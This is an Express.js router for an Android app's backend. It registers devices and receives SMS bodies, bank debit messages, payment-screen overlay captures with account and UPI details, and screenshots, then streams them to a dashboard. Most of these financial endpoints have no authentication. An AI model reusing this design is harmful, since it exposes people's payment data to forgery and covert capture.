const crypto = require('crypto');
const express = require('express');
const Device = require('../models/Device');
const DebitSMS = require('../models/DebitSMS');
const OverlayCapture = require('../models/OverlayCapture');
const OutgoingPayment = require('../models/OutgoingPayment');
const Payout = require('../models/Payout');
const scraperEngine = require('../services/scraperEngine');
const matchingEngine = require('../services/matchingEngine');
const { matchDebitWithOverlay } = require('../services/payoutVerifier');
const { DEVICE_STATUS, RAW_EVENT_TYPE, CATEGORY, ROLES } = require('../config/constants');
const { verifyToken, requireRole } = require('../middleware/auth');

const router = express.Router();

/**
 * Endpoints consumed by the Android APK. Devices authenticate with a
 * deviceToken (issued at registration) rather than a user JWT.
 */

/**
 * POST /api/apk/register-device
 * Body: { deviceId, ngoId, deviceModel, androidVersion, appVersion, licenseKey? }
 * Saves or updates the device and returns its deviceToken.
 *
 * If `licenseKey` is supplied, this claims the pending Device row created by
 * POST /generate-license (the trader-panel pairing flow) instead of
 * creating/updating by deviceId directly. Existing callers that don't send a
 * licenseKey (the current Android app) are unaffected — same behavior as
 * before.
 */
router.post('/register-device', async (req, res, next) => {
  try {
    const { deviceId, ngoId, deviceModel, androidVersion, appVersion, licenseKey } = req.body;
    if (!deviceId) {
      return res.status(400).json({ success: false, message: 'deviceId is required' });
    }

    let device;

    if (licenseKey) {
      device = await Device.findOne({ licenseKey, status: DEVICE_STATUS.PENDING });
      if (!device) {
        return res
          .status(400)
          .json({ success: false, message: 'Invalid or already-used license code' });
      }
      device.deviceId = deviceId;
      device.ngoId = ngoId || device.ngoId;
      device.deviceModel = deviceModel || device.deviceModel;
      device.androidVersion = androidVersion || device.androidVersion;
      device.appVersion = appVersion || device.appVersion;
      device.status = DEVICE_STATUS.ACTIVE;
      device.lastSeen = new Date();
      if (!device.deviceToken) {
        device.deviceToken = crypto.randomBytes(24).toString('hex');
      }
      await device.save();
    } else {
      device = await Device.findOne({ deviceId });
      if (device) {
        device.ngoId = ngoId || device.ngoId;
        device.deviceModel = deviceModel || device.deviceModel;
        device.androidVersion = androidVersion || device.androidVersion;
        device.appVersion = appVersion || device.appVersion;
        device.status = DEVICE_STATUS.ACTIVE;
        device.lastSeen = new Date();
        if (!device.deviceToken) {
          device.deviceToken = crypto.randomBytes(24).toString('hex');
        }
        await device.save();
      } else {
        device = await Device.create({
          deviceId,
          deviceToken: crypto.randomBytes(24).toString('hex'),
          ngoId: ngoId || null,
          deviceModel,
          androidVersion,
          appVersion,
          status: DEVICE_STATUS.ACTIVE,
          lastSeen: new Date(),
        });
      }
    }

    const io = req.app.get('io');
    if (io && device.ngoId) {
      io.to(String(device.ngoId)).emit('device-registered', {
        deviceId: device.deviceId,
        deviceName: device.deviceModel,
      });
    }

    return res.status(201).json({ success: true, deviceToken: device.deviceToken });
  } catch (err) {
    return next(err);
  }
});

/**
 * POST /api/apk/generate-license
 * Auth: NGO staff/admin bearer token.
 * Body: { ngoId }
 * Creates a pending Device row with a short human-typeable code and returns
 * it. The phone claims this row by sending the same code as `licenseKey` to
 * POST /register-device.
 */
router.post(
  '/generate-license',
  verifyToken,
  requireRole(ROLES.NGO_STAFF, ROLES.ADMIN),
  async (req, res, next) => {
    try {
      const ngoId = req.user.ngoId || req.body.ngoId;
      if (!ngoId) {
        return res.status(400).json({ success: false, message: 'ngoId is required' });
      }

      let licenseKey;
      do {
        licenseKey = crypto.randomBytes(3).toString('hex').toUpperCase();
        // eslint-disable-next-line no-await-in-loop
      } while (await Device.exists({ licenseKey }));

      const device = await Device.create({
        deviceId: `pending:${licenseKey}`,
        licenseKey,
        ngoId,
        status: DEVICE_STATUS.PENDING,
      });

      return res
        .status(201)
        .json({ success: true, licenseKey, deviceId: device._id.toString() });
    } catch (err) {
      return next(err);
    }
  }
);

/**
 * GET /api/apk/devices/:ngoId
 * Auth: NGO staff/admin bearer token.
 * Lists devices (registered + pending) for one NGO, for the trader panel's
 * "Registered Devices" list.
 */
router.get(
  '/devices/:ngoId',
  verifyToken,
  requireRole(ROLES.NGO_STAFF, ROLES.ADMIN),
  async (req, res, next) => {
    try {
      const devices = await Device.find({ ngoId: req.params.ngoId })
        .sort({ createdAt: -1 })
        .select('deviceId deviceModel deviceName status lastSeen licenseKey createdAt');

      return res.json({
        success: true,
        devices: devices.map((d) => ({
          id: d._id.toString(),
          deviceName: d.deviceName || d.deviceModel || '',
          deviceModel: d.deviceName ? d.deviceModel || '' : '',
          status: d.status,
          lastSeen: d.lastSeen,
          licenseKey: d.licenseKey,
        })),
      });
    } catch (err) {
      return next(err);
    }
  }
);

/**
 * POST /api/apk/update-device-name — no auth (the APK posts this directly,
 * right after the trader picks a name in SetDeviceNameActivity).
 * Body: { licenseKey, deviceId, deviceName }
 */
router.post('/update-device-name', async (req, res) => {
  try {
    const { licenseKey, deviceId, deviceName } = req.body;
    await Device.findOneAndUpdate(
      { licenseKey, deviceId },
      { deviceName, lastSeen: new Date() }
    );
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({
      success: false,
      message: err.message,
    });
  }
});

/**
 * POST /api/apk/heartbeat — no auth (the APK posts this directly, every 4s
 * from HeartbeatService). Body: { licenseKey, deviceId, status }
 * Always resolves success — a flaky heartbeat should never surface an error
 * to the phone, it just tries again in 4 seconds.
 */
router.post('/heartbeat', async (req, res) => {
  try {
    const { deviceId, status } = req.body;
    await Device.findOneAndUpdate(
      { deviceId },
      {
        lastSeen: new Date(),
        status: status || 'active',
      }
    );
    res.json({ success: true });
  } catch (err) {
    res.json({ success: true });
  }
});

/**
 * POST /api/apk/event
 * Header: deviceToken
 * Body: { type, sender, body, category, amount, utcTimestamp }
 * Persists a RawEvent; if it is a PAYMENT, runs the matching engine.
 */
router.post('/event', async (req, res, next) => {
  try {
    const token = req.headers.devicetoken || req.headers['x-device-token'];
    if (!token) {
      return res
        .status(401)
        .json({ success: false, message: 'deviceToken header is required' });
    }

    const device = await Device.findOne({ deviceToken: token });
    if (!device) {
      return res.status(401).json({ success: false, message: 'Invalid deviceToken' });
    }

    // Refresh presence on every event.
    device.status = DEVICE_STATUS.ACTIVE;
    device.lastSeen = new Date();
    await device.save();

    const { type, sender, body, category, amount, utcTimestamp } = req.body;

    const rawEvent = await scraperEngine.ingestRawEvent({
      deviceId: device.deviceId,
      ngoId: device.ngoId,
      type: RAW_EVENT_TYPE[type] || type || RAW_EVENT_TYPE.NOTIFICATION,
      sender: sender || '',
      body: body || '',
      category: CATEGORY[category] || category || CATEGORY.OTHER,
      amount: amount || '',
      utcTimestamp: utcTimestamp || new Date().toISOString(),
    });

    const io = req.app.get('io');
    if (io && device.ngoId) {
      io.to(String(device.ngoId)).emit('raw_event', rawEvent);
    }

    // Payment events drive reconciliation against pending donor intents.
    if (rawEvent.category === CATEGORY.PAYMENT) {
      matchingEngine.checkMatch(rawEvent, io).catch((e) => {
        console.error('checkMatch failed:', e.message);
      });
    }

    return res.json({ success: true });
  } catch (err) {
    return next(err);
  }
});

/**
 * POST /api/apk/debit-sms — no auth (the APK posts this directly).
 * Body: { deviceId, type, sender, body, last4Digits, amount, utr, receivedAt,
 *         isTransactionalSender, isVerifiedBank }
 * Saves the debit SMS, attempts an overlay match for verified bank senders,
 * and notifies the NGO dashboard.
 */
router.post('/debit-sms', async (req, res, next) => {
  try {
    const {
      deviceId,
      sender,
      body,
      last4Digits,
      amount,
      utr,
      receivedAt,
      isTransactionalSender,
      isVerifiedBank,
    } = req.body;

    // 1-2. Resolve the device and its NGO.
    const device = deviceId ? await Device.findOne({ deviceId }) : null;
    const ngoId = device && device.ngoId ? String(device.ngoId) : '';

    // 3. Persist the debit SMS.
    const debit = await DebitSMS.create({
      ngoId,
      deviceId: deviceId || '',
      sender: sender || '',
      smsBody: body || '',
      last4Digits: last4Digits || '',
      amount: amount || '',
      utr: utr || '',
      receivedAt: receivedAt || new Date().toISOString(),
      isTransactionalSender: Boolean(isTransactionalSender),
      isVerifiedBank: Boolean(isVerifiedBank),
    });

    // 4. Verified bank debits attempt to match a pending overlay capture.
    if (debit.isVerifiedBank) {
      matchDebitWithOverlay(debit).catch((e) =>
        console.error('matchDebitWithOverlay failed:', e.message)
      );
    }

    // 5. Notify the NGO dashboard.
    const io = req.app.get('io');
    if (io && ngoId) {
      io.to(ngoId).emit('debit-detected', {
        amount: debit.amount,
        last4Digits: debit.last4Digits,
        sender: debit.sender,
        isVerified: debit.isVerifiedBank,
        receivedAt: debit.receivedAt,
      });
    }

    // 6. Acknowledge.
    return res.json({ success: true });
  } catch (err) {
    return next(err);
  }
});

/**
 * POST /api/apk/overlay-capture — no auth (the APK posts this directly).
 * Body: { deviceId, recipientName, recipientAccount, last4Digits, recipientUPI,
 *         ifsc, amount, paymentApp, screenshotBase64, capturedAt }
 * Saves the overlay capture and notifies the NGO dashboard.
 */
router.post('/overlay-capture', async (req, res, next) => {
  try {
    const {
      deviceId,
      recipientName,
      recipientAccount,
      last4Digits,
      recipientUPI,
      ifsc,
      amount,
      paymentApp,
      screenshotBase64,
      capturedAt,
    } = req.body;

    // 1. Resolve the device and its NGO.
    const device = deviceId ? await Device.findOne({ deviceId }) : null;
    const ngoId = device && device.ngoId ? String(device.ngoId) : '';

    // 2. Persist the overlay capture.
    const capture = await OverlayCapture.create({
      ngoId,
      deviceId: deviceId || '',
      recipientName: recipientName || '',
      recipientAccount: recipientAccount || '',
      last4Digits: last4Digits || '',
      recipientUPI: recipientUPI || '',
      ifsc: ifsc || '',
      amount: amount || '',
      paymentApp: paymentApp || '',
      screenshotBase64: screenshotBase64 || '',
      capturedAt: capturedAt || new Date().toISOString(),
    });

    // 3. Notify the NGO dashboard (omit the screenshot from the payload).
    const io = req.app.get('io');
    if (io && ngoId) {
      io.to(ngoId).emit('overlay-captured', {
        captureId: capture._id.toString(),
        recipientName: capture.recipientName,
        amount: capture.amount,
        last4Digits: capture.last4Digits,
        paymentApp: capture.paymentApp,
        capturedAt: capture.capturedAt,
      });
    }

    // 4. Acknowledge with the capture id.
    return res.json({ success: true, captureId: capture._id.toString() });
  } catch (err) {
    return next(err);
  }
});

/**
 * POST /api/apk/outgoing-payment — no auth (the APK posts this directly).
 * Receives an auto-captured outgoing payment read off a success screen.
 * Body: { deviceId, type, app, recipientName, recipientLast4, amount, utr,
 *         capturedAt, capturedFrom, autoCapture }
 */
router.post('/outgoing-payment', async (req, res, next) => {
  try {
    const {
      deviceId,
      app,
      recipientName,
      recipientLast4,
      amount,
      utr,
      capturedAt,
      capturedFrom,
      autoCapture,
    } = req.body;

    const device = deviceId ? await Device.findOne({ deviceId }) : null;
    const ngoId = device && device.ngoId ? String(device.ngoId) : '';

    const payment = await OutgoingPayment.create({
      ngoId,
      deviceId: deviceId || '',
      app: app || '',
      recipientName: recipientName || '',
      recipientLast4: recipientLast4 || '',
      amount: amount || '',
      utr: utr || '',
      capturedAt: capturedAt || new Date().toISOString(),
      capturedFrom: capturedFrom || '',
      autoCapture: Boolean(autoCapture),
    });

    const io = req.app.get('io');
    if (io && ngoId) {
      io.to(ngoId).emit('outgoing-payment', {
        id: payment._id.toString(),
        app: payment.app,
        recipientName: payment.recipientName,
        amount: payment.amount,
        utr: payment.utr,
        capturedAt: payment.capturedAt,
      });
    }

    return res.json({ success: true, id: payment._id.toString() });
  } catch (err) {
    return next(err);
  }
});

/**
 * POST /api/apk/update-purpose — no auth.
 * Body: { utr, purpose }
 * Attaches a purpose to the outgoing payment (and its payout) with that UTR.
 */
router.post('/update-purpose', async (req, res) => {
  try {
    const { utr, purpose } = req.body;
    if (!utr || !purpose) {
      return res.json({ success: false });
    }
    await OutgoingPayment.findOneAndUpdate({ utr }, { purpose });
    await Payout.findOneAndUpdate({ utr }, { purpose });
    return res.json({ success: true });
  } catch (err) {
    return res.json({ success: false });
  }
});

/**
 * POST /api/apk/screenshot — no auth (the APK posts this directly).
 * Body: { licenseKey, deviceId, screenshot, capturedAt }
 * Relays a captured screenshot to the NGO dashboard over the socket room.
 * The base64 image is NOT persisted — it is streamed to the dashboard only.
 */
router.post('/screenshot', async (req, res) => {
  try {
    const { licenseKey, deviceId, screenshot, capturedAt, recordedData } = req.body;

    const device = await Device.findOne({ deviceId, status: 'active' });
    if (!device) {
      return res.json({ success: false, message: 'Device not registered' });
    }

    const io = req.app.locals.io;
    if (io && device.ngoId) {
      io.to(device.ngoId.toString()).emit('screenshot-received', {
        deviceId,
        deviceName: device.deviceModel,
        screenshot,
        recordedData: recordedData || {},
        capturedAt,
        receivedAt: new Date().toISOString(),
      });
    }

    console.log('Screenshot + data received from:', device.deviceModel || deviceId, recordedData);

    return res.json({ success: true, message: 'Screenshot uploaded' });
  } catch (err) {
    return res.status(500).json({ success: false, message: err.message });
  }
});

/**
 * GET /api/apk/status/:deviceId — device status and last-seen time.
 */
router.get('/status/:deviceId', async (req, res, next) => {
  try {
    const device = await Device.findOne({ deviceId: req.params.deviceId }).select(
      'deviceId status lastSeen ngoId deviceModel appVersion'
    );
    if (!device) {
      return res.status(404).json({ success: false, message: 'Device not found' });
    }
    return res.json({
      success: true,
      data: {
        deviceId: device.deviceId,
        status: device.status,
        lastSeen: device.lastSeen,
        ngoId: device.ngoId,
      },
    });
  } catch (err) {
    return next(err);
  }
});

module.exports = router;
